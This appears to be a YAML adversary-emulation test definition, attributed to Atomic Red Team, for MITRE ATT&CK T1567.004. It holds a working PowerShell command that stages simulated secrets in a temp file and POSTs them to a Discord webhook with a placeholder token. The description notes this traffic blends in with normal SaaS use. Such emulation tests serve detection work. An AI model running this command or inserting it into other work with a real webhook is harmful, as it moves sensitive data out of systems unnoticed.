- id: f0057c81-24dc-4a2e-b658-5809c242180b
  name: Exfiltrate staged data to a Discord webhook (PowerShell)
  description: 'Stages a file containing simulated sensitive data and exfiltrates
    its contents to a

    Discord incoming webhook by POSTing a JSON `content` payload over HTTPS. Webhook
    URLs

    require no authentication header, so a single HTTPS POST is sufficient to move
    data out

    of the environment while blending in with normal SaaS traffic.

    See https://discord.com/developers/docs/resources/webhook#execute-webhook'
  tactic: exfiltration
  technique:
    attack_id: T1567.004
    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
  platforms:
    windows:
      psh:
        command: '"secrets, api keys, passwords - T1567.004 atomic test" | Out-File
          -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii; $body = @{ content
          = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json;
          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken"
          -Method Post -ContentType ''application/json'' -Body $body'
        cleanup: Remove-Item -Path "#{staged_file}" -ErrorAction Ignore
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - exfiltration
  - atomic-red-team
  - t1567.004
  author: Atomic Red Team
  additional_info:
    input_arguments:
      webhook_url:
        description: Discord incoming webhook URL the staged data is exfiltrated to
        type: string
        default: https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken
      staged_file:
        description: Path to the file that is staged and exfiltrated
        type: path
        default: $env:TEMP\T1567.004_loot.txt
    technique_created: '2023-07-20T15:30:55.763Z'
    atomic_guid: f0057c81-24dc-4a2e-b658-5809c242180b
    import_timestamp: '2026-07-08T05:22:40.554238Z'
